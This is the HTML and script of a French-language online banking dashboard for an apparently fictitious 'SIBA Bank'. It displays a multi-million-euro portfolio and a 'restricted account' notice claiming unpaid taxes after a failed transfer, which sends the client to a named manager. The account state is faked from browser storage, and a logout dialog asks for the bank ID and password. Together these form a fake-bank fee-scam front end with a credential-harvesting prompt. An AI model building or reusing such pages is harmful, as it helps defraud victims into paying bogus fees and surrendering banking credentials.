<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Bank – Tableau de bord</title>
<link rel="stylesheet" href="styles.css">
</head>

<body>

<div class="header">
    <div class="brand">
        <img src="logo.png" alt="SIBA Bank">
        <h2></h2>
    </div>

    <!-- MENU PROFIL -->
    <div class="profile-menu">
        <div class="profile-toggle" onclick="toggleMenu()">
            Anne Marie Dupond ▼
        </div>

        <div id="profileDropdown" class="dropdown">
            <a href="invest.html">Investir</a>
            <a href="withdraw.html">Retrait</a>
            <a href="documents.html">Documents</a>
            <a href="#" onclick="openSupport()">Responsable : Daniel Weber</a>
            <a href="#" style="color:#dc2626;" onclick="openLogout()">Déconnexion</a>
        </div>
    </div>
</div>

<div id="accountAlert" class="alert"></div>

<div class="container">

    <div class="title">Aperçu du portefeuille</div>
    <div class="subtitle">Suivez vos portefeuilles, performances et activités</div>

    <div class="summary">
        <div class="box">
            <h4>Fortune totale</h4>
            <div class="value">€ 4 390 000</div>
        </div>
        <div class="box">
            <h4>Liquidités disponibles</h4>
            <div class="value">€ 320 000</div>
        </div>
        <div class="box">
            <h4>Valeur des investissements</h4>
            <div class="value">€ 4 070 000</div>
        </div>
        <div class="box">
            <div class="history-badge" onclick="openHistory()">
                Historique des transactions
                <span id="notifBadge" class="notif">1</span>
            </div>
            <h4>Performance (Année)</h4>
            <div class="value negative">– € 135 900 (–3,1 %)</div>
        </div>
    </div>

    <div class="actions" style="max-width:400px;margin:40px auto;">
        <a id="transferBtn" href="transfer.html" class="action-btn">Transfert</a>
        <a id="exchangeBtn" href="exchange.html" class="action-btn">Échange</a>
    </div>

    <div class="table">
        <h3>Portefeuilles</h3>
        <table>
            <tr>
                <th>Portefeuille</th><th>Valeur</th><th>Performance</th>
            </tr>
            <tr>
                <td>Tous les portefeuilles<br><span class="small">Patrimoine global</span></td>
                <td>€ 4 390 000</td>
                <td class="negative">– € 135 900</td>
            </tr>
            <tr>
                <td>Exécution seule<br><span class="small">CH-104578-1</span></td>
                <td>€ 280 000</td>
                <td class="negative">– € 6 200</td>
            </tr>
            <tr>
                <td>Gestion pilotée<br><span class="small">CH-104578-2</span></td>
                <td>€ 4 110 000</td>
                <td class="negative">– € 129 700</td>
            </tr>
        </table>
    </div>

</div>

<!-- SUPPORT -->
<div id="supportModal" class="modal">
  <div class="modal-box">
    <h3>Compte sous restriction</h3>
    <p>
      Suite à l’échec d’un virement international, des taxes et obligations fiscales associées n’ont pas été réglées.<br><br>
      Veuillez contacter votre Responsable de relation ou vous rendre en agence pour régularisation.
    </p>
    <button class="action-btn" onclick="closeSupport()">Fermer</button>
  </div>
</div>

<!-- HISTORIQUE -->
<div id="historyModal" class="modal">
  <div class="modal-box">
    <h3>Historique des transactions</h3>
    <div id="historyContent"></div>
    <button class="action-btn" onclick="closeHistory()">Fermer</button>
  </div>
</div>

<!-- LOGOUT -->
<div id="logoutModal" class="modal">
  <div class="modal-box">
    <h3>Confirmer la déconnexion</h3>
    <p>Pour des raisons de sécurité, veuillez confirmer votre identité.</p>

    <input type="text" id="logoutUser" placeholder="Identifiant bancaire" style="width:100%;padding:10px;margin:10px 0;">
    <input type="password" id="logoutPass" placeholder="Mot de passe" style="width:100%;padding:10px;margin-bottom:15px;">

    <button class="action-btn" onclick="confirmLogout()">Se déconnecter</button>
  </div>
</div>

<script>
function toggleMenu(){
  const menu = document.getElementById("profileDropdown");
  menu.style.display = menu.style.display === "block" ? "none" : "block";
}

function openSupport(){ document.getElementById("supportModal").style.display="block"; }
function closeSupport(){ document.getElementById("supportModal").style.display="none"; }

function openHistory(){
  document.getElementById("historyModal").style.display="block";
  localStorage.setItem("unreadCount","0");
  document.getElementById("notifBadge").style.display = "none";
}
function closeHistory(){ document.getElementById("historyModal").style.display="none"; }

function openLogout(){
  document.getElementById("logoutModal").style.display="block";
}

function confirmLogout(){
  const user = document.getElementById("logoutUser").value;
  const pass = document.getElementById("logoutPass").value;

  if(user && pass){
      window.location.href = "login.html";
  } else {
      alert("Veuillez saisir vos informations bancaires.");
  }
}

/* HISTORIQUE */
const history = JSON.parse(localStorage.getItem("transactions") || "[]");
let html="";
history.forEach(t=>{
  html += `<p>${t.date} — ${t.type} — ${t.amount} — <span class="negative">${t.status}</span></p>`;
});
document.getElementById("historyContent").innerHTML = html;

/* NOTIF */
const unread = localStorage.getItem("unreadCount") || "0";
if(unread !== "0"){
  document.getElementById("notifBadge").style.display="inline-block";
  document.getElementById("notifBadge").innerText = unread;
} else {
  document.getElementById("notifBadge").style.display="none";
}

/* BLOCAGE */
if(localStorage.getItem("accountStatus")==="blocked"){
  const alert = document.getElementById("accountAlert");
  alert.style.display="block";
  alert.innerText="Votre compte est bloqué suite à un échec de transaction.";
  document.getElementById("transferBtn").classList.add("disabled");
  document.getElementById("exchangeBtn").classList.add("disabled");
}
</script>

</body>
</html>
